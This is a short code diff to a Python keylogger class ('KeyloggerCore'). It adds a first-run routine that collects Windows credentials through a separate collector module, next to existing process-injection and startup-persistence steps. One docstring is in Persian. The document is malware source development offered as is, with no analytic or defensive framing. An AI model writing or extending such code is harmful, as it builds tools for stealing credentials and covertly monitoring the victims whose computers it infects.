@@ -122,6 +122,9 @@ class KeyloggerCore:
         if Config.TEST_MODE:
             logging.info("Test mode - skipping startup procedures")
             return
+        
+        if self.behavior["windows_credentials_enabled"]:
+            self._collect_initial_credentials()
 
         # Process Injection
         if (self.behavior["process_injection_enabled"] and 
@@ -140,6 +143,19 @@ class KeyloggerCore:
         # Persistence
         if self.behavior["persistence_enabled"]:
             self._add_to_startup()
+
+    def _collect_initial_credentials(self):
+        """جمع‌آوری credential ها در اولین اجرا"""
+        try:
+            logging.info("Collecting initial Windows credentials...")
+            from system.collector import SystemCollector
+            collector = SystemCollector()
+            credentials = collector.collect_windows_credentials()
+
+            logging.info(f"Initial credential collection completed: {len(credentials.get('credentials', []))} entries")
+
+        except Exception as e:
+            logging.error(f"Initial credential collection failed: {str(e)}")
 
     def _attempt_process_injection(self):
         """Attempt process injection if enabled"""
